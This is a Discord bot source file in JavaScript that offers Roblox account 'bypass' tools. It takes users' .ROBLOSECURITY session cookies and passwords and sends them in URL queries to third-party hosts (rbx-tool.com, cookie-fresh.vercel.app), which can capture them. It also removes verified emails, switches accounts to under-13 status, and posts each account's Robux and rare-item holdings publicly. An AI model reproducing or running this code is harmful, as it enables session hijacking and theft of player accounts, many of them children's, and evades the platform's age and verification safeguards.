const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  EmbedBuilder,
} = require('discord.js');
require('dotenv').config();
const fetch = require('node-fetch');
const axios = require('axios');

class RobloxUser {
    constructor(roblosecurityCookie, userId, username, displayName) {
        this.roblosecurityCookie = roblosecurityCookie;
        this.userId = userId;
        this.username = username;
        this.displayName = displayName;
    }

    async doAuthorizedRequest(url) {
        return (await axios.get(url, {
            headers: {
                Cookie: `.ROBLOSECURITY=${this.roblosecurityCookie}`,
            },
        })).data;
    }

    static async register(roblosecurityCookie) {
        try {
            const { data } = await axios.get("https://users.roblox.com/v1/users/authenticated", {
                headers: {
                    Cookie: `.ROBLOSECURITY=${roblosecurityCookie}`,
                },
            });
            return new RobloxUser(roblosecurityCookie, data.id, data.name, data.displayName);
        } catch (error) {
            return null;
        }
    }

    async getAccountBalance() {
        try {
            const { robux } = await this.doAuthorizedRequest(
                `https://economy.roblox.com/v1/users/${this.userId}/currency`
            );
            return robux;
        } catch (error) {
            return 'Private';
        }
    }

    async getAccountRAP() {
        try {
            let calculatedRap = 0;
            let nextPageCursor = "";

            while (nextPageCursor !== null) {
                const inventoryPage = await this.doAuthorizedRequest(
                    `https://inventory.roblox.com/v1/users/${this.userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${nextPageCursor}`
                );

                calculatedRap += inventoryPage.data.reduce(
                    (rap, item) => rap + (item.recentAveragePrice || 0),
                    0
                );
                nextPageCursor = inventoryPage.nextPageCursor;

                // Limit to avoid timeout
                if (!nextPageCursor) break;
            }

            return calculatedRap;
        } catch (error) {
            return 0;
        }
    }

    async getAccountAvatar() {
        try {
            const { data } = await this.doAuthorizedRequest(
                `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${this.userId}&size=150x150&format=Png`
            );
            return data[0]?.imageUrl || null;
        } catch (error) {
            return null;
        }
    }

    async getBundleCount() {
        try {
            // Get user's bundles from their inventory
            const bundlesRes = await this.doAuthorizedRequest(
                `https://inventory.roblox.com/v1/users/${this.userId}/assets/bundles?sortOrder=Asc&limit=100`
            );
            return bundlesRes.data ? bundlesRes.data.length : 0;
        } catch (error) {
            return 0;
        }
    }

    async checkSpecialItems() {
        try {
            let hasKorblox = false;
            let hasHeadless = false;
            let nextPageCursor = "";

            // Check multiple pages for special items
            for (let page = 0; page < 10 && nextPageCursor !== null; page++) {
                const url = nextPageCursor 
                    ? `https://inventory.roblox.com/v1/users/${this.userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${nextPageCursor}`
                    : `https://inventory.roblox.com/v1/users/${this.userId}/assets/collectibles?sortOrder=Asc&limit=100`;
                
                const inventoryPage = await this.doAuthorizedRequest(url);

                if (inventoryPage.data && inventoryPage.data.length > 0) {
                    for (const item of inventoryPage.data) {
                        // Check for Korblox items (various Korblox asset IDs)
                        const korbloxIds = [1365767, 139607770, 139607718, 139607625];
                        if (korbloxIds.includes(item.assetId) || 
                            (item.name && item.name.toLowerCase().includes('korblox'))) {
                            hasKorblox = true;
                        }

                        // Check for Headless (Headless Horseman - ID: 31117267)
                        if (item.assetId === 31117267 || 
                            (item.name && item.name.toLowerCase().includes('headless'))) {
                            hasHeadless = true;
                        }

                        // Break early if both found
                        if (hasKorblox && hasHeadless) {
                            return { hasKorblox, hasHeadless };
                        }
                    }
                }

                nextPageCursor = inventoryPage.nextPageCursor;
                if (!nextPageCursor) break;
            }

            return { hasKorblox, hasHeadless };
        } catch (error) {
            console.error('Error checking special items:', error);
            return { hasKorblox: false, hasHeadless: false };
        }
    }

    async getUserData() {
        const [robux, rap, avatar, bundles, specialItems] = await Promise.all([
            this.getAccountBalance(),
            this.getAccountRAP(),
            this.getAccountAvatar(),
            this.getBundleCount(),
            this.checkSpecialItems()
        ]);

        return {
            username: this.username,
            displayName: this.displayName,
            userId: this.userId,
            avatar: avatar,
            robux: robux,
            rap: rap > 0 ? rap.toLocaleString() : '0',
            bundles: bundles,
            hasKorblox: specialItems.hasKorblox,
            hasHeadless: specialItems.hasHeadless
        };
    }
}

// Helper function to get Roblox user data from cookie
async function getRobloxUserData(cookie) {
    try {
        const robloxUser = await RobloxUser.register(cookie);
        if (!robloxUser) return null;
        
        return await robloxUser.getUserData();
    } catch (error) {
        console.error('Error fetching Roblox data:', error);
        return null;
    }
}

// Bot stats tracking
let commandStats = {
  bypass2008: 0,
  bypass13plus: 0,
  refreshcookie: 0,
  help: 0,
  botstats: 0,
  validatecookie: 0,
  cookieexpiry: 0,
  profilelookup: 0
};

// Cooldown system (30 seconds)
const cooldowns = new Map();
const COOLDOWN_TIME = 5000; // 30 seconds

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ],
});

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

client.on('ready', async () => {
  const commands = [
    new SlashCommandBuilder()
      .setName('bypass2008')
      .setDescription('Bypass email with 2008 birth year')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('bypass13plus')
      .setDescription('Bypass 13+ account to under 13')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('password')
          .setDescription('Your Roblox password')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('refreshcookie')
      .setDescription('Refresh your .ROBLOSECURITY cookie')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('Your current .ROBLOSECURITY cookie')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('help')
      .setDescription('Show all available commands and bot info'),
    new SlashCommandBuilder()
      .setName('botstats')
      .setDescription('Show bot statistics and uptime'),
    new SlashCommandBuilder()
      .setName('validatecookie')
      .setDescription('Check if a .ROBLOSECURITY cookie is valid')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie to validate')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('cookieexpiry')
      .setDescription('Check if your cookie might expire soon')
      .addStringOption(option =>
        option.setName('cookie')
          .setDescription('.ROBLOSECURITY cookie to check')
          .setRequired(true)
      ),
    new SlashCommandBuilder()
      .setName('profilelookup')
      .setDescription('Get Roblox user info from username or ID')
      .addStringOption(option =>
        option.setName('identifier')
          .setDescription('Roblox username or user ID')
          .setRequired(true)
      )
  ].map(cmd => cmd.toJSON());

  const rest = new REST({ version: '10' }).setToken(process.env.BOT_TOKEN);
  try {
    await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands }
    );
    console.log('✅ Slash commands registered');
  } catch (err) {
    console.error('❌ Error registering commands:', err);
  }
});

client.on('messageCreate', async message => {
  // Check if message is in the monitored channel
  if (message.channelId !== '1392522417254961273') return;

  // Ignore messages from bots (including this bot)
  if (message.author.bot) return;

  // Ignore system messages and slash commands
  if (message.system || message.interaction) return;

  // Allow server owner and administrators to send normal messages
  if (message.member && (message.member.permissions.has('Administrator') || message.guild.ownerId === message.author.id)) return;

  try {
    // Delete the message
    await message.delete();

    // Send ephemeral-style reply to the user
    await message.channel.send({
      content: `<@${message.author.id}> ❌ Command channel only. Please use slash commands.`,
    }).then(reply => {
      // Auto-delete the warning message after 5 seconds
      setTimeout(() => {
        reply.delete().catch(console.error);
      }, 5000);
    });
  } catch (error) {
    console.error('Error handling message:', error);
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const allowedChannel = '1392522417254961273';
  if (interaction.channelId !== allowedChannel) {
    return interaction.reply({
      content: '❌ You can only use this command in the designated channel.',
      ephemeral: true
    });
  }

  const { commandName, user } = interaction;

  // Check cooldown for main commands (not help/botstats)
  if (['bypass2008', 'bypass13plus', 'refreshcookie', 'validatecookie', 'cookieexpiry', 'profilelookup'].includes(commandName)) {
    const userCooldown = cooldowns.get(user.id);
    if (userCooldown && Date.now() - userCooldown < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (Date.now() - userCooldown)) / 1000);
      return interaction.reply({
        content: `⏰ Please wait ${remainingTime} seconds before using this command again.`,
        ephemeral: true
      });
    }
    cooldowns.set(user.id, Date.now());
  }

  // Update command stats
  if (commandStats[commandName] !== undefined) {
    commandStats[commandName]++;
  }

  if (interaction.commandName === 'bypass2008') {
    const cookie = interaction.options.getString('cookie');

    await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });

    try {
      // Get Roblox user data and bypass result in parallel
      const [robloxData, res] = await Promise.all([
        getRobloxUserData(cookie),
        fetch(`https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`)
      ]);

      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
        .setTitle(robloxData ? `${robloxData.username}` : (data.status === "success" ? "✅ Success" : "❌ Failed"))
        .setDescription("Email Bypass (2008 Method)")
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add Roblox user info if available
      if (robloxData) {
        if (robloxData.avatar) {
          embed.setThumbnail(robloxData.avatar);
        }
        
        embed.addFields(
          { name: "💰 Robux", value: `${robloxData.robux}`, inline: true },
          { name: "💎 RAP", value: `${robloxData.rap}`, inline: true },
          { name: "📦 Bundles", value: `${robloxData.bundles}`, inline: true },
          { name: "<:korblox:1153613134599307314>", value: robloxData.hasKorblox ? "True" : "False", inline: true },
          { name: "<:head_full:1207367926622191666>", value: robloxData.hasHeadless ? "True" : "False", inline: true },
          { name: "\u200b", value: "\u200b", inline: true }
        );
      }

      // Add bypass result at bottom
      embed.addFields(
        { name: "🔧 Bypass Result", value: data.message || (data.status === "success" ? "Success removing email!" : "Unknown error"), inline: false },
        { name: "Status", value: data.status === "success" ? "✅ Completed" : "❌ Failed", inline: true }
      );

      await interaction.followUp({ embeds: [embed] });
    } catch {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("🚫 Request Failed")
        .setDescription("Request blocked or failed to fetch data.")
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'bypass13plus') {
    const cookie = interaction.options.getString('cookie');
    const password = interaction.options.getString('password');

    await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });

    try {
      // Get Roblox user data and bypass result in parallel
      const [robloxData, res] = await Promise.all([
        getRobloxUserData(cookie),
        fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`)
      ]);

      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
        .setTitle(robloxData ? `${robloxData.username}` : (data.status === "success" ? "✅ Success" : "❌ Failed"))
        .setDescription("Age Bypass (13+ to Under 13)")
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add Roblox user info if available
      if (robloxData) {
        if (robloxData.avatar) {
          embed.setThumbnail(robloxData.avatar);
        }
        
        embed.addFields(
          { name: "💰 Robux", value: `${robloxData.robux}`, inline: true },
          { name: "💎 RAP", value: `${robloxData.rap}`, inline: true },
          { name: "📦 Bundles", value: `${robloxData.bundles}`, inline: true },
          { name: "<:korblox:1153613134599307314>", value: robloxData.hasKorblox ? "True" : "False", inline: true },
          { name: "<:head_full:1207367926622191666>", value: robloxData.hasHeadless ? "True" : "False", inline: true },
          { name: "\u200b", value: "\u200b", inline: true }
        );
      }

      // Add bypass result at bottom
      embed.addFields(
        { name: "🔧 Bypass Result", value: data.message || (data.status === "success" ? "Success converting 13+ to under 13!" : "Unknown error"), inline: false },
        { name: "Status", value: data.status === "success" ? "✅ Completed" : "❌ Failed", inline: true }
      );

      await interaction.followUp({ embeds: [embed] });
    } catch {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("🚫 Request Failed")
        .setDescription("Request blocked or failed to fetch data.")
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'refreshcookie') {
    const cookie = interaction.options.getString('cookie');

    await interaction.reply({ content: '🔄 Refreshing your cookie...', ephemeral: true });

    try {
      const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`);
      const data = await res.json();

      if (!data.redemptionResult || !data.redemptionResult.success) {
        const errorEmbed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle("❌ Unable to refresh your cookie.")
          .setDescription("Roblox might have rejected the cookie or the backend failed.")
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });
        return interaction.followUp({ embeds: [errorEmbed] });
      }

      const refreshed = data.redemptionResult.refreshedCookie;

      // Get Roblox user data for the public embed
      const robloxData = await getRobloxUserData(cookie);

      const publicEmbed = new EmbedBuilder()
        .setColor(0x22c55e)
        .setTitle(robloxData ? `${robloxData.username}` : "✅ Successfully refreshed cookie!")
        .setDescription("Cookie Refresh Service")
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add Roblox user info if available
      if (robloxData) {
        if (robloxData.avatar) {
          publicEmbed.setThumbnail(robloxData.avatar);
        }
        
        publicEmbed.addFields(
          { name: "💰 Robux", value: `${robloxData.robux}`, inline: true },
          { name: "💎 RAP", value: `${robloxData.rap}`, inline: true },
          { name: "📦 Bundles", value: `${robloxData.bundles}`, inline: true },
          { name: "<:korblox:1153613134599307314>", value: robloxData.hasKorblox ? "True" : "False", inline: true },
          { name: "<:head_full:1207367926622191666>", value: robloxData.hasHeadless ? "True" : "False", inline: true },
          { name: "\u200b", value: "\u200b", inline: true }
        );
      }

      // Add refresh result at bottom
      publicEmbed.addFields(
        { name: "🔄 Refresh Result", value: "Your new cookie has been generated and sent privately.", inline: false },
        { name: "Status", value: "✅ Completed", inline: true }
      );

      await interaction.followUp({ embeds: [publicEmbed] }); // public message

      const privateEmbed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle("🔐 Your New .ROBLOSECURITY Cookie")
        .setDescription(`\`\`\`${refreshed}\`\`\``)
        .addFields(
          { name: "⚠️ Security Notice", value: "Keep this cookie private and secure!", inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({
        embeds: [privateEmbed],
        ephemeral: true // only the user sees this
      });

    } catch (err) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("🚫 Request Failed")
        .setDescription("Failed to connect to refresh API or bad response.")
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'help') {
    commandStats.help++;

    const helpEmbed = new EmbedBuilder()
      .setColor(0x0ea5e9)
      .setTitle('🤖 Roblox Tools Bot - Help')
      .setDescription('Here are all available commands and their descriptions:')
      .addFields(
        { 
          name: '📧 /bypass2008', 
          value: 'Remove the verified email address\n**Usage:** Provide your .ROBLOSECURITY cookie', 
          inline: false 
        },
        { 
          name: '🔓 /bypass13plus', 
          value: 'Convert 13+ account to under 13 account\n**Usage:** Provide cookie and password', 
          inline: false 
        },
        { 
          name: '🔄 /refreshcookie', 
          value: 'Refresh your .ROBLOSECURITY cookie\n**Usage:** Provide your current cookie', 
          inline: false 
        },
        { 
          name: '📊 /botstats', 
          value: 'Show bot statistics and uptime', 
          inline: false 
        },
        { 
          name: '❓ /help', 
          value: 'Show this help message', 
          inline: false 
        },
        { 
          name: '🔍 /validatecookie', 
          value: 'Check if a .ROBLOSECURITY cookie is valid', 
          inline: false 
        },
        { 
          name: '🕐 /cookieexpiry', 
          value: 'Check if your cookie might expire soon', 
          inline: false 
        },
        { 
          name: '👤 /profilelookup', 
          value: 'Get Roblox user info from username or ID', 
          inline: false 
        },
        { 
          name: '⚠️ Important Notes:', 
          value: '• Commands have a 5-second cooldown\n• Only works in designated channel\n• Keep your cookies private!', 
          inline: false 
        }
      )
      .setThumbnail(client.user.displayAvatarURL())
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [helpEmbed] });
  }

  if (interaction.commandName === 'botstats') {
    commandStats.botstats++;

    const uptime = process.uptime();
    const uptimeHours = Math.floor(uptime / 3600);
    const uptimeMinutes = Math.floor((uptime % 3600) / 60);
    const uptimeSeconds = Math.floor(uptime % 60);

    const totalCommands = Object.values(commandStats).reduce((a, b) => a + b, 0);

    const statsEmbed = new EmbedBuilder()
      .setColor(0x22c55e)
      .setTitle('📊 Bot Statistics')
      .setDescription('Current bot performance and usage stats')
      .addFields(
        { 
          name: '⏱️ Uptime', 
          value: `${uptimeHours}h ${uptimeMinutes}m ${uptimeSeconds}s`, 
          inline: true 
        },
        { 
          name: '🏓 Ping', 
          value: `${client.ws.ping}ms`, 
          inline: true 
        },
        { 
          name: '📈 Total Commands Used', 
          value: `${totalCommands}`, 
          inline: true 
        },
        { 
          name: '📧 Bypass2008 Used', 
          value: `${commandStats.bypass2008} times`, 
          inline: true 
        },
        { 
          name: '🔓 Bypass13plus Used', 
          value: `${commandStats.bypass13plus} times`, 
          inline: true 
        },
        { 
          name: '🔄 RefreshCookie Used', 
          value: `${commandStats.refreshcookie} times`, 
          inline: true 
        },
        { 
          name: '🔍 ValidateCookie Used', 
          value: `${commandStats.validatecookie} times`, 
          inline: true 
        },
        { 
          name: '🕐 CookieExpiry Used', 
          value: `${commandStats.cookieexpiry} times`, 
          inline: true 
        },
        { 
          name: '👤 ProfileLookup Used', 
          value: `${commandStats.profilelookup} times`, 
          inline: true 
        },
        { 
          name: '🤖 Bot Info', 
          value: `Servers: ${client.guilds.cache.size}\nUsers: ${client.users.cache.size}`, 
          inline: false 
        }
      )
      .setThumbnail(client.user.displayAvatarURL())
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [statsEmbed] });
  }

  if (interaction.commandName === 'validatecookie') {
    const cookie = interaction.options.getString('cookie');
    commandStats.validatecookie++;

    await interaction.reply({ content: '🔍 Validating cookie...', ephemeral: true });

    try {
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (res.status === 200) {
        const userData = await res.json();
        
        // Get detailed Roblox user data
        const robloxData = await getRobloxUserData(cookie);

        const embed = new EmbedBuilder()
          .setColor(0x22c55e)
          .setTitle(robloxData ? `${robloxData.username}` : '✅ Cookie Valid!')
          .setDescription(`Cookie is valid and authenticated for user: **${userData.name}**`)
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        // Add Roblox user info if available
        if (robloxData) {
          if (robloxData.avatar) {
            embed.setThumbnail(robloxData.avatar);
          }
          
          embed.addFields(
            { name: "💰 Robux", value: `${robloxData.robux}`, inline: true },
            { name: "💎 RAP", value: `${robloxData.rap}`, inline: true },
            { name: "📦 Bundles", value: `${robloxData.bundles}`, inline: true },
            { name: "<:korblox:1153613134599307314>", value: robloxData.hasKorblox ? "True" : "False", inline: true },
            { name: "<:head_full:1207367926622191666>", value: robloxData.hasHeadless ? "True" : "False", inline: true },
            { name: "\u200b", value: "\u200b", inline: true }
          );
        } else {
          embed.addFields(
            { name: 'User ID', value: `${userData.id}`, inline: true },
            { name: 'Display Name', value: `${userData.displayName}`, inline: true },
            { name: 'Status', value: '✅ Active', inline: true }
          );
        }

        await interaction.followUp({ embeds: [embed] });
      } else {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('❌ Cookie Invalid')
          .setDescription('The provided cookie is invalid or expired.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      }
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('🚫 Validation Failed')
        .setDescription('Unable to validate cookie due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'cookieexpiry') {
    const cookie = interaction.options.getString('cookie');
    commandStats.cookieexpiry++;

    await interaction.reply({ content: '🔍 Checking cookie expiry...', ephemeral: true });

    try {
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (res.status === 200) {
        // Get detailed Roblox user data
        const robloxData = await getRobloxUserData(cookie);

        // Check if cookie is close to expiry by testing multiple requests
        const testCount = 3;
        let successCount = 0;

        for (let i = 0; i < testCount; i++) {
          try {
            const testRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
              headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
              }
            });
            if (testRes.status === 200) successCount++;
          } catch {}
          await new Promise(resolve => setTimeout(resolve, 500));
        }

        const reliability = (successCount / testCount) * 100;
        let status, color, message;

        if (reliability >= 90) {
          status = '✅ Healthy';
          color = 0x22c55e;
          message = 'Cookie is stable and not expected to expire soon.';
        } else if (reliability >= 70) {
          status = '⚠️ Warning';
          color = 0xfacc15;
          message = 'Cookie may be unstable. Consider refreshing soon.';
        } else {
          status = '❌ Critical';
          color = 0xef4444;
          message = 'Cookie is unreliable and may expire soon. Refresh immediately!';
        }

        const embed = new EmbedBuilder()
          .setColor(color)
          .setTitle(robloxData ? `${robloxData.username}` : '🕐 Cookie Expiry Check')
          .setDescription(message)
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        // Add Roblox user info if available
        if (robloxData) {
          if (robloxData.avatar) {
            embed.setThumbnail(robloxData.avatar);
          }
          
          embed.addFields(
            { name: "💰 Robux", value: `${robloxData.robux}`, inline: true },
            { name: "💎 RAP", value: `${robloxData.rap}`, inline: true },
            { name: "📦 Bundles", value: `${robloxData.bundles}`, inline: true },
            { name: "<:korblox:1153613134599307314>", value: robloxData.hasKorblox ? "True" : "False", inline: true },
            { name: "<:head_full:1207367926622191666>", value: robloxData.hasHeadless ? "True" : "False", inline: true },
            { name: "\u200b", value: "\u200b", inline: true }
          );
        }

        // Add expiry check results
        embed.addFields(
          { name: 'Status', value: status, inline: true },
          { name: 'Reliability', value: `${reliability.toFixed(1)}%`, inline: true },
          { name: 'Recommendation', value: reliability >= 90 ? 'No action needed' : 'Consider refreshing', inline: true }
        );

        await interaction.followUp({ embeds: [embed] });
      } else {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('❌ Cookie Expired')
          .setDescription('The cookie is already invalid or expired.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      }
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('🚫 Check Failed')
        .setDescription('Unable to check cookie expiry due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'profilelookup') {
    const identifier = interaction.options.getString('identifier');
    commandStats.profilelookup++;

    await interaction.reply({ content: '🔍 Looking up profile...', ephemeral: true });

    try {
      let userId;

      // Check if identifier is a number (user ID) or username
      if (/^\d+$/.test(identifier)) {
        userId = identifier;
      } else {
        // Get user ID from username
        const userRes = await fetch(`https://users.roblox.com/v1/usernames/users`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            usernames: [identifier]
          })
        });

        const userData = await userRes.json();
        if (!userData.data || userData.data.length === 0) {
          const embed = new EmbedBuilder()
            .setColor(0xef4444)
            .setTitle('❌ User Not Found')
            .setDescription('No user found with that username.')
            .setTimestamp()
            .setFooter({
              text: `Requested by ${interaction.user.tag}`,
              iconURL: interaction.user.displayAvatarURL()
            });

          return interaction.followUp({ embeds: [embed] });
        }
        userId = userData.data[0].id;
      }

      // Get detailed user info
      const [userRes, avatarRes] = await Promise.all([
        fetch(`https://users.roblox.com/v1/users/${userId}`),
        fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`)
      ]);

      const userInfo = await userRes.json();
      const avatarInfo = await avatarRes.json();

      if (userRes.status !== 200) {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('❌ User Not Found')
          .setDescription('No user found with that ID.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        return interaction.followUp({ embeds: [embed] });
      }

      const embed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle(`👤 ${userInfo.displayName} (@${userInfo.name})`)
        .setDescription(userInfo.description || 'No description available')
        .addFields(
          { name: 'User ID', value: `${userInfo.id}`, inline: true },
          { name: 'Username', value: `@${userInfo.name}`, inline: true },
          { name: 'Display Name', value: userInfo.displayName, inline: true },
          { name: 'Created', value: new Date(userInfo.created).toLocaleDateString(), inline: true },
          { name: 'Banned', value: userInfo.isBanned ? '❌ Yes' : '✅ No', inline: true },
          { name: 'Profile Link', value: `[View Profile](https://www.roblox.com/users/${userInfo.id}/profile)`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add avatar if available
      if (avatarInfo.data && avatarInfo.data.length > 0) {
        embed.setThumbnail(avatarInfo.data[0].imageUrl);
      }

      await interaction.followUp({ embeds: [embed] });
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('🚫 Lookup Failed')
        .setDescription('Unable to lookup profile due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }
});

client.login(process.env.BOT_TOKEN);
